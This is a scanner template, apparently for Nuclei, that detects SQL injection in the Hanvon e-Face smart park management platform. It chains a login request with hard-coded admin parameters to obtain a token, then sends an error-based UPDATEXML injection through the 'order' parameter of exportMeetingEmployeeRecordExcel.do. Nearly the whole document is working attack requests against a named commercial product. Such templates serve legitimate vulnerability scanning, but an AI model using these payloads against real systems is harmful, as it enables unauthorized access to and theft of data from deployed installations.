id: poc-yaml-hw-e-face-pass-spmp-exportmeetingemployeerecordexcel-do-sqli

info:
  name: 汉王e脸通智慧园区管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: token-retrieval
    name: Retrieve Token
    method: POST
    path:
      - '{{BaseURL}}/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"userName":"admin"'
      - type: regex
        part: body
        regex:
          - '"password":"([0-9a-z]+)"'
    extractors:
      - type: regex
        name: token
        internal: true
        regex:
          - '"token":"(?P<token>.*?)",'

  - id: sqli-detection
    name: SQL Injection Detection
    method: GET
    path:
      - '{{BaseURL}}/manage/mobiMeetingApp/exportMeetingEmployeeRecordExcel.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,md5({{t1}}),0x7e,(SELECT+(ELT(2920=2920,1)))),8357))'
    headers:
      token: '{{token}}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "code"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - '{{substr(t2,0,31)}}'
